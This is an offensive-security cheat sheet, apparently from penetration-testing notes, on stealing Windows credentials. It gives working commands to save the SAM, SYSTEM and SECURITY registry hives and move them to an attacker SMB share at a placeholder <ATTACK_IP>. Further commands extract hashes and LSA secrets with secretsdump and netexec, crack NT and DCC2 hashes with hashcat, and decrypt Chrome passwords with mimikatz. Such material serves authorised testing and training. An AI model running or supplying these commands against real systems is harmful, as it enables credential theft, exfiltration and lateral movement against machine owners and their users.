1. Got local admin shell? Dump registry hives for offline analysis to avoid maintaining active sessions.
2. Need to move files to attack host? Spin up a listener and push files via SMB.
3. Files exfiltrated? Use offline tools to extract NT hashes, LSA secrets, and DPAPI keys.
4. Remote admin creds but no shell? Dump SAM and LSA secrets over the network.
5. Captured hashes? Identify type (NT vs DCC2) and crack based on speed/priority.

---

## Local Registry Hive Extraction

Gaining local administrative access allows dumping the SAM, SYSTEM, and SECURITY hives for offline decryption.

**Commands** Save the local SAM database containing user password hashes

```
reg.exe save hklm\sam <FILE_PATH>\sam.save
```

Save the SYSTEM hive to extract the boot key required for SAM decryption

```
reg.exe save hklm\system <FILE_PATH>\system.save
```

Save the SECURITY hive to extract cached domain credentials (DCC2) and LSA secrets

```
reg.exe save hklm\security <FILE_PATH>\security.save
```

**Gotchas** **Administrative privileges** are mandatory; these commands will fail in a standard user context.

## Exfiltration via SMB Share

Moving exfiltrated registry hives to the attack host via an SMB share.

**Commands** Start an SMB server on the attack host compatible with modern Windows versions

```
sudo python3 smbserver.py -smb2support <SHARE_NAME> <FILE_PATH>
```

Transfer the saved hive files from the target to the attacker share

```
move <FILE_PATH> \\<ATTACK_IP>\<SHARE_NAME>
```

**Dangerous / misconfigured settings**

- Missing the `-smb2support` flag: **Connection will fail** on newer Windows systems because SMBv1 is disabled by default.

## Offline Secret Extraction

Analyzing exfiltrated registry hives on the attack host to extract credentials and keys.

**Commands** Extract all local hashes, LSA secrets, and DPAPI keys from exfiltrated hives

```
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

**Gotchas** **Missing SYSTEM hive**: The SAM database cannot be decrypted without the boot key stored in the SYSTEM hive.

## Remote Credential Dumping

Extracting secrets over the network using valid local administrator credentials.

**Commands** Dump local SAM hashes remotely using valid credentials

```
netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --sam
```

Extract LSA secrets, DPAPI keys, and cached credentials remotely

```
netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --lsa
```

**Edge cases**

- Use `netexec` when you have credentials but lack an interactive shell or want to avoid uploading tools to the target.

## Password Cracking

Cracking extracted NT and DCC2 hashes using wordlists.

**Commands** Crack NT hashes (standard local Windows passwords)

```
hashcat -m 1000 <FILE_PATH> /usr/share/wordlists/rockyou.txt
```

Crack DCC2 hashes (Domain Cached Credentials)

```
hashcat -m 2100 '<HASH>' /usr/share/wordlists/rockyou.txt
```

**Tool comparison**

- NT Hashes: Fast cracking speed; useful for immediate lateral movement.
- DCC2 Hashes: **800x slower** than NT hashes; use only if NT hashes are unavailable or uncrackable.

**Gotchas** **DCC2 limitations**: These hashes cannot be used for Pass-the-Hash attacks.

## DPAPI Decryption

Decrypting data blobs protected by the Data Protection API, such as stored browser passwords.

### Mimikatz

**Commands** Decrypt stored Google Chrome passwords using DPAPI

```
mimikatz.exe "dpapi::chrome /in:\"<FILE_PATH>\" /unprotect"
```

**Edge cases**

- DPAPI is used by Chrome, IE, Outlook, and RDP for credential storage; target these files if registry hashes yield no results.

> ⚠️ Gap: The source does not specify that the `reg.exe save` command may fail if the target file path is currently in use or protected by specific security software, though it notes the requirement for administrative privileges.